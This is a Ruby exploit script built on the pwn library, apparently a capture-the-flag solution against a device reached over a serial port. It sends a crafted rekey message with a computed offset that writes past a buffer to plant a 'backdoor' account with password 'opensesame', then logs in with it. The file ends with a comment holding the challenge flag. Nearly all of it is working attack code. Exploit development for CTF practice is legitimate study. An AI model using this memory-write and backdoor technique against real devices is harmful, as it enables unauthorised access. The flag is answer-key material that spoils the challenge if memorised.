#!/usr/bin/ruby
# encoding: ASCII-8BIT

require 'pwn'
require 'digest'

Username = 'backdoor'
Password = 'opensesame'
StackBase = 0x3ebe
EntrySize = 34
WriteTarget = 0x3001

def send(string)
	puts hexdump string
	$serial.sendline string
end

def printValid(string)
	string.each_char do |c|
		if 32 <= c.ord && c.ord <=126 then
			print c
		elsif c == "\n" || c == "\r" then
			print "\n"
		else
			print '.'
		end
	end
end

def rekeyAccount(username, password)
	hash = Digest::SHA256.digest password
	raise if hash.include? "\0"
	raise if hash.include? "\n"
	payload = hash

	# 3 is username.length.to_s.length + ':'.length
	# 5 is payload.length.to_s.length + ':'.length (but payload length not known yet..
	# +1 because of forward vs backward swap
	offset = StackBase - WriteTarget - (3 + 5 + payload.length) + 1

	send '%d:%d:%s'%[payload.length, offset, payload]
end

def login(username, password)
	send '%d:%d:%s'%[username.length, password.length, username+password]
end

def waitForPrompt(prompt)
	buffer = ''
	loop do
		char = $serial.recvn 1, timeout:1
		buffer += char
		printValid char
		sleep 0.1 if char.empty?
		break if buffer =~ prompt
	end
	puts "\n#{Time.now()}"
	sleep 0.5
end

begin
	if ARGV.length < 1 then
		puts "Usage: #{$0} <port>"
		exit(1)
	end

	$serial = Pwnlib::Tubes::SerialTube.new ARGV[0], 115_200, false
	puts 'ready and waiting...'

	waitForPrompt /Initialized/
	puts 'prompt found, proceeding...'

	rekeyAccount(Username, Password)

	waitForPrompt /Unknown user!/
	login(Username, Password)

	waitForPrompt /Unknown user!/
	puts 'fail'
end

# Your flag is:
#
# 18c495dbe625cd39544fc6e3bab81a2d

